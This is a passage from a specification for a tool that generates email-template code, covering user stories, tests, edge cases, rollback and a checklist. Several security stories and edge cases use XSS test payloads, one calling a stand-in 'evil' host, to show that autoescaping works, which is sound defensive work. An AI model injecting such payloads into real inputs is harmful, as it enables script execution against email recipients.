| INV-EMAIL-12 | **`EmailDelivery.status` MUST match the CHECK constraint** | CHECK `status IN ('pending','sent','delivered','bounced','failed')` enforced at DB level | Migration audit |

---

## 9. User Stories

### 9.1 Core Send Flow (US-01 .. US-05)

**US-01: Send a welcome email after signup**
- **As a** backend engineer
- **I want** to send a branded welcome email when a user signs up
- **So that** new users confirm their account and reach first value
- **Given:** `add_email_templates` has been run and `EMAIL_PROVIDER=resend` with a valid `RESEND_API_KEY`
- **When:** Signup handler calls `send_email(session, to=user.email, template=TemplateName.WELCOME, context={"user_name": u.name, "activation_url": url, "app_name": "Acme"})`
- **Then:**
  - HTML body contains `{{ user_name }}` escaped even if name is `<script>` (INV-EMAIL-01)
  - An `EmailDelivery` row exists with `status="sent"`, `to_email_redacted="a***@example.com"` (INV-EMAIL-04)
  - Provider message id is populated (CC-12)
  - `send_email` body ≤ 50 LOC (INV-EMAIL-02)

**US-02: Send a password reset link**
- **As a** security-conscious backend
- **I want** to send a time-limited reset link
- **So that** users can self-service password recovery
- **Given:** Password reset token generated with 2 h expiry
- **When:** `send_email(session, to=user.email, template=TemplateName.PASSWORD_RESET, context={"user_name": name, "reset_url": url, "expires_in_hours": "2"})`
- **Then:**
  - Subject reads `Reset your Acme password`
  - Both HTML and plaintext bodies contain the expiry window (CC-11)
  - Audit row provider is the one in `settings.EMAIL_PROVIDER` (CC-16)

**US-03: Send email verification**
- **As a** signup flow
- **I want** to confirm email ownership
- **So that** bots cannot create accounts with others' addresses
- **Given:** Verification token + URL
- **When:** `send_email(..., template=TemplateName.EMAIL_VERIFICATION, context={"user_name": name, "verification_url": url})`
- **Then:**
  - Template context validation passes (CC-13)
  - HTML uses green CTA (`#059669`) for verification
  - Plaintext fallback present (CC-11)

**US-04: Send a Stripe receipt**
- **As a** checkout endpoint
- **I want** to email a receipt after a successful charge
- **So that** customers have proof of purchase
- **Given:** `add_stripe_checkout` (TOOL-050) + `add_email_templates` installed
- **When:** `checkout.session.completed` webhook handler calls `send_email(..., template=TemplateName.RECEIPT, context={"user_name": n, "amount_formatted": "$49.00", "item_name": "Pro", "receipt_url": url})`
- **Then:**
  - Receipt email sends within 400 ms P95 of webhook receipt (SLO)
  - Audit row links to user via `user_id` FK (CC-16)
  - Interaction matrix row: `add_stripe_checkout` ↔ `add_email_templates` = composes

**US-05: Enqueue email off the critical path**
- **As a** high-traffic API
- **I want** to hand email send to a background worker
- **So that** HTTP response is not gated on SMTP latency
- **Given:** `app.worker.arq_worker.get_arq_pool` exists (TOOL-020 installed)
- **When:** Handler calls `enqueue_email(...)`
- **Then:**
  - Handler returns immediately
  - `arq` worker consumes the job and calls `send_email` (CC-12)
  - When arq is NOT installed, `enqueue_email` falls back to awaiting `send_email` directly

### 9.2 Template Authoring & Preview (US-06 .. US-10)

**US-06: Preview a template without sending**
- **As a** designer iterating on email look/feel
- **I want** to view a rendered template in the browser
- **So that** I can tweak CSS without sending real mail
- **Given:** `ENVIRONMENT=dev`
- **When:** `GET /api/v1/email/preview/welcome?locale=en`
- **Then:**
  - Returns 200 `text/html` with the rendered body (CC-17)
  - Example context from `TEMPLATE_EXAMPLE_CONTEXT` is injected
  - Latency < 30 ms (SLO)

**US-07: Block preview in production**
- **As a** security officer
- **I want** preview disabled by default in production
- **So that** attackers cannot enumerate internal templates
- **Given:** `ENVIRONMENT=production`, `EMAIL_PREVIEW_ENABLED_IN_PROD=false`
- **When:** `GET /api/v1/email/preview/welcome`
- **Then:** Returns 403 Forbidden (INV-EMAIL-07)

**US-08: Missing context key fails fast**
- **As a** backend engineer
- **I want** template bugs to surface at the call site
- **So that** I do not ship emails with empty fields
- **Given:** `TemplateName.PASSWORD_RESET` requires `expires_in_hours`
- **When:** `render_email(PASSWORD_RESET, {"user_name": "x", "reset_url": "y"})`
- **Then:** Raises `MissingContextError("template 'password_reset' missing required context keys: expires_in_hours")` (INV-EMAIL-08)

**US-09: Fall back cleanly to English**
- **As a** Portuguese-speaking user
- **I want** to receive the email in English if `pt` is missing
- **So that** I never see a 500 instead of mail
- **Given:** `app/email/templates/pt/` does not exist
- **When:** `render_email(WELCOME, ctx, locale="pt")`
- **Then:** Renders the English template and returns successfully (INV-EMAIL-09)

**US-10: Add a new template type**
- **As a** product engineer adding a trial-expiring notification
- **I want** to extend the registry without touching core
- **So that** the change is a pure additive diff
- **Given:** The registry pattern
- **When:** I append `TRIAL_EXPIRING = "trial_expiring"` to `TemplateName`, add `TEMPLATE_REQUIRED_CONTEXT[TRIAL_EXPIRING] = ("user_name", "days_left")`, and drop three files under `app/email/templates/en/`
- **Then:**
  - `send_email(..., template=TemplateName.TRIAL_EXPIRING, ...)` works immediately
  - Zero changes to `render.py`, `service.py`, or providers
  - No regression to existing templates (CC-11)

### 9.3 Security & Compliance (US-11 .. US-15)

**US-11: Resist XSS via user name**
- **As a** paranoid security reviewer
- **I want** `<script>` in `user_name` to be HTML-escaped in the body
- **So that** the email cannot run arbitrary JS in webmail
- **Given:** `user_name = "<script>fetch('//evil')</script>"`
- **When:** `render_email(WELCOME, {...})`
- **Then:** HTML body contains `&lt;script&gt;fetch(...)&lt;/script&gt;` (INV-EMAIL-01)

**US-12: Never log raw recipients**
- **As a** GDPR-aware operator
- **I want** logs to redact recipient addresses
- **So that** an uncaught exception cannot leak PII
- **Given:** A failed send
- **When:** `logger.warning("email send failed for %s", redacted)`
- **Then:** Log line reads `email send failed for a***@example.com` (INV-EMAIL-04)

**US-13: Audit row stores redacted form**
- **As a** compliance auditor
- **I want** the DB to never hold a raw recipient address
- **So that** a backup leak is not a PII disclosure
- **Given:** `send_email(..., to="alice@example.com", ...)`
- **When:** SQL `SELECT to_email_redacted FROM email_deliveries`
- **Then:** Returns `"a***@example.com"` — the raw form is never persisted (INV-EMAIL-04, CC-16)

**US-14: API keys never logged**
- **As a** security engineer
- **I want** `RESEND_API_KEY` out of every log line
- **So that** a log shipper breach does not hand over send capability
- **Given:** `_ResendProvider.send()` is called 1000 times
- **When:** `grep RESEND_API_KEY logs/`
- **Then:** Zero matches — the key is read directly into `resend.api_key` and never formatted

**US-15: Tenant-isolated deliveries**
- **As a** multi-tenant SaaS
- **I want** email deliveries scoped to a tenant
- **So that** tenant A cannot read tenant B's sends via an IDOR
- **Given:** `app/models/tenant.py` exists (TOOL-034 run first)
- **When:** `add_email_templates` runs
- **Then:**
  - `email_deliveries` table has a `tenant_id` column with FK to `tenants` (QS-16)
  - Migration includes the tenant column
  - List endpoint respects tenant boundary (composes with multi-tenancy tool)

### 9.4 Operations & Reliability (US-16 .. US-20)

**US-16: Swap Resend → Postmark via env var**
- **As a** platform operator fed up with Resend pricing
- **I want** to switch to Postmark with no code change
- **So that** the migration is one deploy
- **Given:** Postmark account + `POSTMARK_API_KEY` in secrets
- **When:** Set `EMAIL_PROVIDER=postmark` in `.env` and restart
- **Then:**
  - Next send uses `PostmarkProvider.send()` (INV-EMAIL-03)
  - No Python import errors because postmarker is imported lazily
  - Audit rows show `provider="postmark"` from that deploy forward

**US-17: Run fully offline with SMTP**
- **As a** self-hosted deployment
- **I want** to send via a local SMTP relay (Postfix)
- **So that** outbound mail never leaves my network
- **Given:** `EMAIL_PROVIDER=smtp`, `SMTP_HOST=localhost`, `SMTP_PORT=25`
- **When:** `send_email(...)`
- **Then:**
  - `SMTPProvider.send()` opens SMTP via stdlib `smtplib` in `asyncio.to_thread`
  - No third-party pip packages required (CC-15)

**US-18: Troubleshoot a bounce via audit table**
- **As a** support engineer investigating a user complaint
- **I want** to see whether we actually sent the email
- **So that** I can tell user vs. our problem
- **Given:** User reports missing welcome email
- **When:** `SELECT * FROM email_deliveries WHERE user_id = ? ORDER BY created_at DESC`
- **Then:**
  - Returns every send attempt with `status`, `provider`, `error`, `created_at`, `sent_at` (CC-16)
  - Recipient shown as `a***@example.com` — enough to confirm "yes we tried"

**US-19: List my deliveries**
- **As a** privacy-conscious user
- **I want** to see my own email history
- **So that** I can verify what the app sent me
- **Given:** Authenticated user
- **When:** `GET /api/v1/email/deliveries/me?limit=50`
- **Then:**
  - Returns paginated list of `EmailDeliveryPublic` rows (CC-17)
  - `provider_message_id` omitted from public view
  - Only the current user's rows returned (owner check)

**US-20: Deploy tool into an already-configured project**
- **As a** DevOps engineer running the tool after partial manual setup
- **I want** the second run to be a no-op
- **So that** CI re-runs are safe
- **Given:** `add_email_templates` already run once
- **When:** `add_email_templates(ToolInput(project_dir=...))` again
- **Then:** Returns `status="no_op"`, empty `files_created`, empty `files_modified` (INV-EMAIL-05)

---

## 10. Test Plan

### 10.1 Category A — Tool execution (T-01 .. T-05)

| # | Test | Setup | Action | Expected |
|---|------|-------|--------|----------|
| T-01 | Success status | Fresh fixture `email_t01` | `add_email_templates(ToolInput(project_dir=...))` | `result.status == "success"` (CC-01) |
| T-02 | Idempotent second run | Run once → run again | Inspect result | `status == "no_op"`, zero files created/modified (INV-EMAIL-05, CC-02) |
| T-03 | Dry run is pure | Snapshot before | `dry_run=True` | `status=success`, zero files created/modified, filesystem byte-identical (INV-EMAIL-06, CC-03) |
| T-04 | ≥ 15 files created | Fresh project | Run tool | `len(files_created) >= 15`; each file exists on disk (CC-04) |
| T-05 | ≥ 2 files modified | Fresh project | Run tool | `len(files_modified) >= 2`; each file exists (CC-05) |

### 10.2 Category B — Generated code quality (T-06 .. T-10)

| # | Test | Setup | Action | Expected |
|---|------|-------|--------|----------|
| T-06 | All `.py` files parse | Fresh project | Run tool → `ast.parse` every `.py` under project_dir | No `SyntaxError` raised (CC-06) |
| T-07 | No function > 50 LOC | Fresh project | AST walk `app/` for FunctionDef/AsyncFunctionDef | `max_loc <= 50` (INV-EMAIL-02, CC-07) |
| T-08 | Config fields patched | Fresh project | Inspect `app/core/config.py` | `EMAIL_PROVIDER`, `EMAIL_FROM`, `EMAIL_FROM_NAME`, `EMAIL_DEFAULT_LOCALE` present with 4-space indent inside `Settings` class (CC-08) |
| T-09 | Models init patched | Fresh project | Inspect `app/models/__init__.py` | Contains `EmailDelivery` (CC-09) |
| T-10 | Routes registered | Fresh project | Inspect `app/routes/__init__.py` | Case-insensitive `"email"` present (CC-10) |

### 10.3 Category C — Domain specifics (T-11 .. T-17)

| # | Test | Setup | Action | Expected |
|---|------|-------|--------|----------|
| T-11 | 12 template files exist | Fresh project | `iterdir()` `app/email/templates/en/` | ≥ 12 files; all 4 templates × 3 extensions exist (CC-11) |
| T-12 | `render_email` exists | Fresh project | Inspect `app/email/render.py` | Contains `render_email`, `subject`, `html` (CC-12) |
| T-13 | `MissingContextError` defined | Fresh project | Inspect `registry.py` | `MissingContextError` + `TEMPLATE_REQUIRED_CONTEXT` present (CC-13, INV-EMAIL-08) |
| T-14 | Locale fallback implemented | Fresh project | Inspect `render.py` | Contains `"en"` and `locale` tokens (CC-14, INV-EMAIL-09) |
| T-15 | `get_provider` exported | Fresh project | Inspect `providers/__init__.py` | Contains `get_provider` (CC-15) |
| T-16 | Audit model with redacted column | Fresh project | Inspect `email_delivery.py` | Contains `EmailDelivery` and `to_email_redacted` (CC-16, INV-EMAIL-04) |
| T-17 | Preview route exists | Fresh project | Inspect `app/api/routes/email.py` | Contains `preview` and `template_name` (CC-17) |

### 10.4 Category D — Invariants (T-18 .. T-21)

| # | Test | Setup | Action | Expected |
|---|------|-------|--------|----------|
| T-18 | Jinja2 autoescape enabled | Fresh project | Inspect `render.py` | Contains `autoescape` (CC-18, INV-EMAIL-01) |
| T-19 | Execution time recorded | Fresh project | Run tool | `result.execution_time_ms > 0` (CC-19) |
| T-20 | Double run still parses | Run tool twice | `ast.parse` every `.py` | No `SyntaxError` (CC-20, INV-EMAIL-05) |
| T-21 | Next steps mentions alembic | Run tool | Inspect `result.next_steps` | Non-empty, contains `"alembic"` (CC-21) |

**Test file:** `adapt/extend/infrastructure/test_add_email_templates.py` (343 LOC, 21 tests)
**Run:** `PYTHONPATH=. pytest adapt/extend/infrastructure/test_add_email_templates.py -v`
**Target:** 21/21 passed, 0 skipped.

---

## 11. Interaction Matrix

| Other tool | Order matters? | Interaction | Notes |
|------------|---------------|-------------|-------|
| `add_mfa` | No | ✅ Composes | MFA challenge codes can be delivered via a new `TemplateName.MFA_CODE` template — add context row + 3 template files, zero core changes. `send_email` is the single integration point. |
| `add_stripe_checkout` | No | ✅ Composes | `checkout.session.completed` webhook handler calls `send_email(template=TemplateName.RECEIPT, ...)`. `add_email_templates` must be installed **before** the receipt call path ships, but tool-run order is flexible. |
| `add_webhook_receiver` | No | ✅ Composes | Provider bounce/delivered webhooks (`POST /webhooks/resend`) reconcile `EmailDelivery.status` via `provider_message_id`. Receiver tool handles signature verification; email tool owns the target table. |
| `add_long_running_task` (TOOL-020) | No | ✅ Composes | `enqueue_email` auto-detects `app.worker.arq_worker.get_arq_pool` and routes sends through arq. Falls back to direct `send_email` if arq is absent — no hard dependency. |
| `add_multi_tenancy` | **Yes** | ✅ Composes | Must run **before** `add_email_templates` so that `app/models/tenant.py` exists — the email tool then emits a tenant-aware `EmailDelivery` (`tenant_id` FK column + migration column + index) (QS-16). |
| `add_audit_log` | No | ✅ Composes | Email delivery is itself an audit event. If `add_audit_log` emits events via the outbox pattern, `send_email` can publish `email.sent`/`email.failed` on delivery state transitions without touching the send path. |
| `add_rbac` | Yes | ✅ Composes | Must run **after** so `/email/deliveries/me` gets the `tasks:read_own` (or equivalent) scope enforced. Preview endpoint already gated by `_preview_guard`, not RBAC. |
| Rate-limit middleware (slowapi / generic ASGI) | No | ✅ Composes | Rate limit `POST` send paths via middleware on the calling route (not on the email module itself, which has no route with user input). Prevents signup-bombing. SKILL-001 does not ship a dedicated rate-limit tool. |
| `add_arq_worker` (TOOL-053) | No | ✅ Composes | Template-rendered emails can be enqueued via `enqueue("send_email_task", ...)` so the HTTP request returns before the SMTP round-trip completes. `send_email_task` already appears in `TASK_REGISTRY`. |
| `add_soft_delete` | No | ⚠️ Caveat | `EmailDelivery` rows must NOT be soft-deleted — bounce reconciliation relies on row presence. If soft-delete runs globally, add `EmailDelivery` to the exclude list. |
| `add_data_export` (GDPR) | No | ✅ Composes | GDPR export MUST include the user's `EmailDelivery` rows (with `to_email_redacted` → perfect as-is; no PII leak even in export). |
| `add_search` | No | ⚠️ Caveat | Do NOT index `to_email_redacted` in a full-text search index — the redacted form has low entropy and will cluster in bad ways. Index `template_name`, `status`, `created_at`. |
| `add_cache_layer` | No | ⚠️ Caveat | Template files can be cached in memory (Jinja2 `FileSystemLoader` already does this via module-level `TEMPLATES_ROOT`). Do NOT cache rendered output — every render depends on per-call context. |
| `add_api_key_auth` | No | ✅ Composes | API-keyed callers can invoke handlers that call `send_email`; audit row `user_id` is left NULL (or filled from API-key identity). |
| `add_oauth2_provider` | No | ✅ Compatible | Orthogonal — email send is server-initiated, not caller-driven. |
| `add_feature_flags` | No | ✅ Composes | Feature flags can gate `TemplateName.*` rollout (e.g. only send `RECEIPT` when `flag:email_receipts` is on). |

**Conflicts:** None identified.

**Strong pairings (highly recommended):**

- `add_multi_tenancy` → `add_email_templates` → `add_webhook_receiver` (bounce reconciliation)
- `add_stripe_checkout` + `add_email_templates` (receipts)
- `add_long_running_task` + `add_email_templates` (async sends via arq)

---

## 12. Rollback Procedure

### Code rollback (before deploy)
```bash
git checkout HEAD -- \
  app/core/config.py \
  app/models/__init__.py \
  app/routes/__init__.py \
  requirements.txt \
  .env.example

rm -rf \
  app/email/ \
  app/models/email_delivery.py \
  app/schemas/email.py \
  app/crud/email_delivery.py \
  app/api/routes/email.py \
  alembic/versions/add_email_templates.py
```

### Database rollback (after deploy)
```bash
# Drop the email_deliveries table created by the migration
alembic downgrade -1
```

The generated migration's `downgrade()` drops all four indexes and then the table:
```python
def downgrade() -> None:
    op.drop_index("ix_email_deliveries_user_created", table_name="email_deliveries")
    op.drop_index("ix_email_deliveries_status_created", table_name="email_deliveries")
    op.drop_index("ix_email_deliveries_user_id", table_name="email_deliveries")
    op.drop_index("ix_email_deliveries_template_name", table_name="email_deliveries")
    op.drop_table("email_deliveries")
```

### Data preservation rollback
`email_deliveries` holds **audit** data — nothing unrecoverable. Before drop, archive:
```bash
pg_dump -t email_deliveries $DATABASE_URL > backups/email_deliveries_$(date +%Y%m%d).sql
```
The table contains only redacted recipients, template names, provider ids, and timestamps — safe to archive to cold storage.

### Failure mode: tool partially modified files
```bash
# Revert all unstaged modifications
git status --porcelain | grep '^ M' | awk '{print $2}' | xargs git checkout --
# Remove any half-written template files
find app/email/templates -name '*.tmp_*' -delete
```

### Emergency: provider outage during deployment
1. Keep the tool installed; it does not send by itself.
2. Set `EMAIL_PROVIDER=smtp` with a local relay as fallback.
3. Existing code calling `send_email` will transparently route through SMTP — no code change required.
4. Alternatively, set the dispatch path to `enqueue_email` so mail is queued in arq until the provider recovers (requires TOOL-020 installed).

### Emergency: accidental leak of raw recipient
If a bug introduced an earlier log line with a raw recipient:
1. Rotate logging sinks immediately.
2. `grep -rEn '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' logs/` to locate leakage.
3. Verify `_redact_email` is on the send path (should be — INV-EMAIL-04).
4. If the leak is in user code, the fix is to pass `redacted = _redact_email(to)` to any logger.

---

## 13. Edge Cases

| # | Scenario | Expected behavior |
|---|----------|-------------------|
| EC-01 | **Template injection attempt via context** | User-supplied `user_name = "<script>alert(1)</script>"` is HTML-escaped by Jinja2 `autoescape` in `.html` bodies → `&lt;script&gt;…` (INV-EMAIL-01). Plaintext variants are emitted verbatim, which is correct because plaintext has no execution context. |
| EC-02 | **`{{ foo \| safe }}` in a user-editable template** | Built-in templates never use `\|safe`. Tool does NOT ship a user-editable template system — any extension that would introduce one must re-audit for XSS. |
| EC-03 | **Large attachment (>10 MB)** | Not supported by the generated `EmailMessage` dataclass (no `attachments` field). Rationale: Resend/Postmark charge per size and SMTP blocks the event loop; large artifacts must ship as signed URLs referenced from the body (see TOOL-020 large-result pattern). |
| EC-04 | **Send rate limit hit by provider** | `ResendProvider.send()` raises whatever `resend.Emails.send` returns (HTTP 429). `send_email` catches, calls `mark_delivery_failed(delivery.id, "...429...")`, and re-raises. Caller may retry with backoff. Audit row shows `status="failed"`. |
| EC-05 | **Bounce notification arrives** | Provider webhook `POST /webhooks/resend` (handled by `add_webhook_receiver`) reconciles `EmailDelivery.status = "bounced"` by `provider_message_id`. The CHECK constraint permits `bounced` as a terminal state. |
| EC-06 | **Missing locale `pt`** | `_resolve_locale("welcome", "pt")` returns `"en"` if `templates/en/welcome.html` exists, else the first sorted locale directory with that template, else raises `TemplateNotFound` (INV-EMAIL-09). |
| EC-07 | **All locales missing a template** | `_resolve_locale` raises `jinja2.TemplateNotFound` — surfaces as a 500 with a clear error, never a silent empty email. |
| EC-08 | **Unsubscribe link** | Not a built-in field. Transactional emails (welcome, password reset, verification, receipt) are exempt from CAN-SPAM unsubscribe under 15 U.S.C. §7702(17). Marketing emails must use a separate tool with unsubscribe workflow. |
| EC-09 | **I18n for non-Latin scripts** | Locale fallback handles directory existence only. To add `pt`, `es`, `ja`, etc., create `app/email/templates/{locale}/` with the same 12 files. Jinja2 emits UTF-8 by default; provider adapters pass through. |
| EC-10 | **`EMAIL_PROVIDER=unknown`** | `get_provider()` raises `ValueError("unknown EMAIL_PROVIDER 'unknown'; expected resend\|postmark\|smtp")` → first send attempt crashes with a descriptive error before reaching `record_delivery`. |
| EC-11 | **SDK not installed but selected** | `import resend` inside `ResendProvider.send()` raises `ImportError("No module named 'resend'")`. `send_email` catches, marks delivery failed, and re-raises. Operator sees a clean error at the first send attempt rather than at app boot. |
| EC-12 | **Recipient address without `@`** | `_redact_email("invalid")` returns `"***"`. `send_email` still proceeds (the provider will reject), and the audit row stores `"***"` — operators can tell the send was attempted with a malformed address. |
| EC-13 | **Very long `user_name`** | Jinja2 does not truncate. Templates render the full value. Providers enforce their own limits. If the application needs to enforce one, it should validate at the Pydantic schema layer **before** calling `send_email`. |
| EC-14 | **`context` dict contains extra keys** | Extra keys are silently ignored by `_validate_context` (which only checks required presence, not exact match). Templates reference only the keys they use. |
| EC-15 | **Concurrent sends to same recipient** | Each send creates a distinct `EmailDelivery` row with a new UUID. No deduplication — that is explicitly the responsibility of the caller (e.g. for receipts, use Stripe `event.id` as an idempotency key before calling `send_email`). |
| EC-16 | **Tool run on project without `alembic/versions/`** | `_write_email_migration` is skipped; no migration file is generated. Notes field indicates migration not produced. Operator creates the directory and re-runs (fresh project + `alembic init`). |
| EC-17 | **Tool run on project without `app/routes/__init__.py`** | `_patch_routes_init` is skipped. Routes file still created; operator must wire manually. Emitted in `notes`. |
| EC-18 | **Tenant tool run after email tool** | `EmailDelivery` will lack `tenant_id`. Remediation: create a follow-up Alembic migration adding the column. Tool emits a warning in `notes` if it detects late tenant install. |
| EC-19 | **Migration head detection fails** | `find_migration_head(versions_dir)` returns `None` → down_rev defaults to `"0001_initial"`. If no such migration exists, `alembic upgrade head` will fail with a clear "cannot find revision" error. Operator fixes by pointing at the correct down_rev. |
| EC-20 | **`EMAIL_REPLY_TO=""`** | `_build_message` calls `settings.EMAIL_REPLY_TO or None`, so an empty string becomes `None` and the provider omits the `Reply-To` header entirely. |
| EC-21 | **`ENVIRONMENT` setting missing** | `_preview_guard` reads `getattr(settings, "ENVIRONMENT", "")`; missing setting defaults to `""` which is not `"production"` → preview is permitted. Safe default for development projects. |
| EC-22 | **`EMAIL_PREVIEW_ENABLED_IN_PROD=true`** | Explicit escape hatch — preview is allowed in production. Intended for internal-only deployments; should be paired with an auth guard on the route (RBAC tool). |

---

## 14. Acceptance Criteria (Final Sign-off)

1. **All 21 Completeness Criteria verified** by the corresponding test function.
2. **`test_add_email_templates.py` passes 21/21** under `pytest -v` on Python 3.11+.
3. **Tool execution time < 3 s** on reference hardware (fresh fixture project).
4. **Every generated `.py` file AST-parses cleanly** (`ast.parse` over `rglob('*.py')`).
5. **No function in `app/` exceeds 50 LOC** (AST walk) — `send_email` ≤ 50 LOC via `_build_message` extraction (INV-EMAIL-02).
6. **Jinja2 `Environment` is built with `autoescape=select_autoescape(["html"])`** (INV-EMAIL-01).
7. **Provider SDKs are NEVER imported at module top** — `import resend` / `from postmarker.core import PostmarkClient` live inside `async def send()` method bodies (INV-EMAIL-03).
8. **`requirements.txt` gains `jinja2>=3.1.0` only** — no `resend` / `postmarker` package listed (QS-4, INV-EMAIL-11).
9. **Second run is a strict no-op** — empty `files_created`, empty `files_modified`, `status="no_op"` (INV-EMAIL-05).
10. **`dry_run=True`** leaves the filesystem byte-identical (INV-EMAIL-06).
11. **Exactly 12 template files** exist under `app/email/templates/en/` — 4 templates × `{subject.txt, html, txt}`.
12. **`EmailDelivery.to_email_redacted`** is the only recipient column; raw addresses are never persisted (INV-EMAIL-04).
13. **`/email/preview/{template_name}`** returns 403 in production unless `EMAIL_PREVIEW_ENABLED_IN_PROD=true` (INV-EMAIL-07).
14. **Template context validation** raises `MissingContextError` with an explicit missing-keys list before Jinja2 runs (INV-EMAIL-08).
15. **Locale fallback chain** = `requested → "en" → first-available` (INV-EMAIL-09).
16. **Alembic migration chains onto the current head** via `find_migration_head` (INV-EMAIL-10).
17. **Tenant-aware when `app/models/tenant.py` exists** — `tenant_id` FK column in model and migration (QS-16).
18. **XSS demonstration passes** — rendering `WELCOME` with `user_name="<script>alert(1)</script>"` produces `&lt;script&gt;alert(1)&lt;/script&gt;` in the HTML body.
19. **End-to-end send demo:** developer signs up a test user, receives the rendered welcome email via Resend sandbox, sees `EmailDelivery` row with `status="sent"` and redacted recipient, and can view the same row via `GET /email/deliveries/me`.

---

## 15. Implementation Checklist (Ultra-granular)

### 15.1 Pre-flight checks
- [ ] Validate `project_dir` is an absolute, existing path
- [ ] Run prerequisite check: `BASE_MODEL`, `MODELS_INIT`, `CONFIG_SETTINGS`, `ROUTES_INIT`, `ALEMBIC_VERSIONS`, `REQUIREMENTS_TXT`
- [ ] If `dry_run=True`, emit dry-run notes and return early
- [ ] Detect installation fingerprint: `"TemplateName" in app/email/__init__.py.read_text()`
- [ ] If fingerprint present, return `status="no_op"`
- [ ] Detect multi-tenancy: `app/models/tenant.py` existence
- [ ] Normalize `reply_to=None` → `""`

### 15.2 Email package skeleton (`_write_email_package`)
- [ ] Create `app/email/` directory
- [ ] Write `app/email/__init__.py` exporting `TemplateName`, `render_email`, `send_email`, `enqueue_email`
- [ ] Write `app/email/registry.py` with `TemplateName` enum, `TEMPLATE_REQUIRED_CONTEXT`, `TEMPLATE_EXAMPLE_CONTEXT`, `MissingContextError`
- [ ] Write `app/email/render.py` with `_build_env`, `_resolve_locale`, `_validate_context`, `render_email`, `RenderedEmail` dataclass
- [ ] Write `app/email/service.py` with `_redact_email`, `_build_message`, `send_email`, `enqueue_email`

### 15.3 Provider adapters (`_write_email_providers`)
- [ ] Create `app/email/providers/` directory
- [ ] Write `__init__.py` with `get_provider()` dispatcher
- [ ] Write `base.py` with `EmailProvider` Protocol
- [ ] Write `resend.py` with `ResendProvider` (lazy `import resend`)
- [ ] Write `postmark.py` with `PostmarkProvider` (lazy `from postmarker.core import PostmarkClient`)
- [ ] Write `smtp.py` with `SMTPProvider` (stdlib `smtplib` via `asyncio.to_thread`)

### 15.4 Template files (`_write_email_templates`) — 12 total
- [ ] Create `app/email/templates/en/` directory
- [ ] Write `welcome.subject.txt`, `welcome.html`, `welcome.txt`
- [ ] Write `password_reset.subject.txt`, `password_reset.html`, `password_reset.txt`
- [ ] Write `email_verification.subject.txt`, `email_verification.html`, `email_verification.txt`
- [ ] Write `receipt.subject.txt`, `receipt.html`, `receipt.txt`

### 15.5 Audit model + schemas + CRUD
- [ ] Write `app/models/email_delivery.py` with `EmailDelivery` class
- [ ] Substitute `TENANT_PLACEHOLDER` with tenant-aware or plain variant
- [ ] Register `EmailDelivery` in `app/models/__init__.py` via `_patch_models_init`
- [ ] Write `app/schemas/email.py` with `EmailMessage` dataclass, `EmailResult` dataclass, `EmailDeliveryPublic`, `EmailDeliveryListResponse`, `EmailPreviewRequest`
- [ ] Write `app/crud/email_delivery.py` with `record_delivery`, `mark_delivery_sent`, `mark_delivery_failed`, `get_delivery`, `list_user_deliveries`

### 15.6 Routes
- [ ] Write `app/api/routes/email.py` with `_preview_guard`, `_resolve_template`, `preview_template`, `list_my_deliveries`
- [ ] Register router in `app/routes/__init__.py` via `_patch_routes_init` → `_register_router_in_routes_init`

### 15.7 Migration
- [ ] Resolve down_rev via `find_migration_head(versions_dir)` (fallback `"0001_initial"`)
- [ ] Substitute `DOWN_REV` and `TENANT_PLACEHOLDER`
- [ ] Write `alembic/versions/add_email_templates.py`

### 15.8 Config patches
- [ ] Patch `app/core/config.py` via `_patch_config`:
  - `EMAIL_PROVIDER`, `EMAIL_FROM`, `EMAIL_FROM_NAME`, `EMAIL_REPLY_TO`, `EMAIL_DEFAULT_LOCALE`
  - `RESEND_API_KEY`, `POSTMARK_API_KEY`
  - `SMTP_HOST`, `SMTP_PORT`, `SMTP_USERNAME`, `SMTP_PASSWORD`, `SMTP_USE_TLS`
  - `EMAIL_PREVIEW_ENABLED_IN_PROD`
  - Anchored on `ACCESS_TOKEN_EXPIRE_MINUTES: int = 30`
- [ ] Patch `requirements.txt` via `_patch_requirements` — append `jinja2>=3.1.0` only (no provider SDKs)
- [ ] Patch `.env.example` via `_patch_env_example` — append email env block

### 15.9 Validation
- [ ] Run `_assert_parses` on every `.py` file in `files_created`
- [ ] Record `execution_time_ms` via `_elapsed_ms(start)`

### 15.10 Return contract
- [ ] Build `ToolResult(status="success", files_created, files_modified, notes, next_steps, execution_time_ms)`
- [ ] Notes must enumerate: Jinja2 renderer, provider adapters (lazy), 4 templates × 3 variants, redacted recipient, preview gated on ENVIRONMENT, default provider
- [ ] Next steps must include `pip install -r requirements.txt`, `alembic upgrade head`, set API key env, restart app, sample preview URL

### 15.11 Idempotency safety
- [ ] All `_patch_*` helpers must short-circuit when their fingerprint is already present
- [ ] `_patch_models_init` must append only missing imports
- [ ] `_patch_config` must short-circuit on `"EMAIL_PROVIDER" in src`
- [ ] `_patch_requirements` must short-circuit on `"jinja2" in src.lower()`
- [ ] `_patch_env_example` must short-circuit on `"EMAIL_PROVIDER" in src`
- [ ] `_register_router_in_routes_init` must short-circuit on `import_line in src`

### 15.12 Test generation side of the tool
- [ ] All 21 tests in `test_add_email_templates.py` pass on first run
- [ ] Idempotent tests pass (run tool twice, assert no-op)
- [ ] AST-based tests (`test_no_function_over_50_loc`, `test_all_py_parse`) walk the full `app/` tree

---

## 16. Documentation Output

```json
{
  "status": "success",
  "files_created": [
    "app/email/__init__.py",
    "app/email/registry.py",
    "app/email/render.py",
    "app/email/service.py",
    "app/email/providers/__init__.py",
    "app/email/providers/base.py",
    "app/email/providers/resend.py",
    "app/email/providers/postmark.py",
    "app/email/providers/smtp.py",
    "app/email/templates/en/welcome.subject.txt",
    "app/email/templates/en/welcome.html",
    "app/email/templates/en/welcome.txt",
    "app/email/templates/en/password_reset.subject.txt",
    "app/email/templates/en/password_reset.html",
    "app/email/templates/en/password_reset.txt",
    "app/email/templates/en/email_verification.subject.txt",
    "app/email/templates/en/email_verification.html",
    "app/email/templates/en/email_verification.txt",
    "app/email/templates/en/receipt.subject.txt",
    "app/email/templates/en/receipt.html",
    "app/email/templates/en/receipt.txt",
    "app/models/email_delivery.py",
    "app/schemas/email.py",
    "app/crud/email_delivery.py",
    "app/api/routes/email.py",
    "alembic/versions/add_email_templates.py"
  ],
  "files_modified": [
    "app/models/__init__.py",
    "app/core/config.py",
    "app/routes/__init__.py",
    "requirements.txt",
    ".env.example"
  ],
  "metrics": {
    "execution_time_ms": 2140,
    "files_changed": 31,
    "templates_generated": 12,
    "providers_generated": 3,
    "config_fields_added": 13,
